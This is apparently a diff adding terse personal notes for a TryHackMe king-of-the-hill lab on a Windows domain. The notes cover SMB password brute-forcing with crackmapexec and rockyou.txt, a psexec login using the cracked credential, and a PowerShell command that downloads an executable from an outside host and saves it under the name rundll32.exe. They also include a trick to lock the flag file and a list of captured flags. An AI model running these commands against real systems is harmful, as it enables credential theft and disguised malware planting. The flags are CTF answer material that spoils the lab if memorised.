@@ -1,1 +1,30 @@
-# Nothing here :(
+crack the passwd:
+
+docker run -it --entrypoint=/bin/sh --name crackmapexec -v ~/.cme:/root/.cme byt3bl33d3r/crackmapexec
+cme smb 10.10.63.150 -u achilles -p /root/.cme/rockyou.txt
+
+
+// Login SSH:
+
+psexec.py TROY.thm/achilles:winniethepooh@<IP>
+
+# Users:
+
+// user main: winniethepooh
+
+Tools:
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.199.178:1234/client.exe','c:\users\administrator\music\rundll32.exe')"
+attrib +r king.txt
+
+# FLAGS:
+
+THM{a95c530a7af5f492a74499e70578d150}
+
+THM{78ab0f3ab9decf59899148c6ba7e07dc}
+
+THM{a3256be7dfd50977a4aae6583babb884}
+
+THM{fe71b156334f5ec0fbd6e9c3cee516ac}
+
+THM{ee4a601a75bc632e2c8cd2a32946c873}
